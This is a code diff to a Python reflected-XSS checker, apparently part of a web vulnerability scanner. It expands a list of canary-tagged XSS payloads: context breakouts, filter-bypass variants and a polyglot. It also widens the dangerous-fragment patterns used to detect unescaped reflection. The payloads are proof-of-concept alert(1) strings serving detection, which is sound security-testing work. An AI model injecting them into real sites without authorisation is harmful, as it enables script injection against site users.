@@ -1,7 +1,6 @@
 """Reflected XSS checker — differential canary reflection detection."""
 
 import re
-from html import unescape
 from typing import Optional, List
 
 import httpx
@@ -19,27 +18,56 @@ class XSS(BaseChecker):
         c = self.canary
 
         self.payloads_list = [
-            # Break out of text context
+            # ── Text context breakout ───────────────────────────
             f"{c}<script>alert(1)</script>",
             f'{c}"><svg/onload=alert(1)>',
             f"{c}'><img src=x onerror=alert(1)>",
-            # Break out of tag context
+            f"{c}<img/src=x onerror=alert(1)>",
+            f"{c}<iframe src=javascript:alert(1)>",
+            f'{c}<body onload=alert(1)>',
+
+            # ── Tag context breakout ────────────────────────────
             f"{c}</title><svg/onload=alert(1)>",
             f"{c}</textarea><script>alert(1)</script>",
-            # Break out of HTML comment
+            f"{c}</style><script>alert(1)</script>",
+            f"{c}</noscript><script>alert(1)</script>",
+
+            # ── HTML comment breakout ───────────────────────────
             f"{c}--><svg/onload=alert(1)>",
-            # Break out of script context
+
+            # ── Script context breakout ─────────────────────────
             f"{c}</script><script>alert(1)</script>",
-            # Attribute context
+            f"{c}'-alert(1)-'",
+            f'{c}"-alert(1)-"',
+
+            # ── Attribute context ───────────────────────────────
             f'{c}"><body onfocus=alert(1) autofocus>',
             f"{c}' autofocus onfocus=alert(1) x='",
-            # Template literal context
+            f'{c}" onmouseover=alert(1) x="',
+            f'{c}" onfocus=alert(1) autofocus="',
+
+            # ── Template literal context ────────────────────────
             f"{c}`-alert(1)-`",
-            # Event handler via IMG
+            f"{c}${{alert(1)}}",
+
+            # ── Event handler via IMG ───────────────────────────
             f'{c}"><img src=x onerror=alert(1)//>',
+            f'{c}<svg onload=alert(1)//>',
+
+            # ── Encoding bypass variants ────────────────────────
+            f"{c}<ScRiPt>alert(1)</sCrIpT>",          # mixed case
+            f"{c}<svg/onload=alert`1`>",                # backtick
+            f"{c}<img src=x onerror=alert&lpar;1&rpar;>",  # HTML entities
+            f"{c}<details open ontoggle=alert(1)>",
+            f"{c}<marquee onstart=alert(1)>",
+            f"{c}<input onfocus=alert(1) autofocus>",
+            f"{c}<video><source onerror=alert(1)>",
+            f"{c}<audio src=x onerror=alert(1)>",
+
+            # ── Polyglot payloads ───────────────────────────────
+            f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e{c}",
         ]
 
-        # Regex for the injected canary appearing alongside unescaped dangerous chars
         self._canary_rx = re.compile(re.escape(self.canary))
 
     def get_payloads(self) -> List[str]:
@@ -82,21 +110,18 @@ class XSS(BaseChecker):
 
     def _is_unescaped_reflection(self, body: str, payload: str) -> bool:
         """Check if the EXACT payload appears in the body without HTML-encoding."""
-        # The full payload (canary + dangerous chars) must appear as-is
         if payload in body:
             return True
 
         # Check for common dangerous fragments near the canary
         c = self.canary
         danger = [
-            f"{c}<script",
-            f"{c}<svg",
-            f"{c}<img",
-            f"{c}</script>",
-            f"{c}</title>",
-            f"{c}</textarea>",
-            f'{c}">',
-            f"{c}'>",
+            f"{c}<script", f"{c}<svg", f"{c}<img", f"{c}<iframe",
+            f"{c}<body", f"{c}<input", f"{c}<details", f"{c}<video",
+            f"{c}<audio", f"{c}<marquee",
+            f"{c}</script>", f"{c}</title>", f"{c}</textarea>",
+            f"{c}</style>", f"{c}</noscript>",
+            f'{c}">', f"{c}'>", f"{c}-->",
         ]
         body_lower = body.lower()
         for d in danger:
@@ -107,13 +132,10 @@ class XSS(BaseChecker):
 
     def _has_partial_reflection(self, body: str) -> bool:
         """Canary is present but we couldn't confirm unescaped injection."""
-        # Check if entities are used around canary (signs of escaping)
         idx = body.find(self.canary)
         if idx < 0:
             return False
-        # Look at the 200 chars after the canary
         snippet = body[idx:idx + 200]
-        # If snippet contains raw < or > near canary, could be dangerous
         if "<" in snippet or ">" in snippet:
             return True
         return False
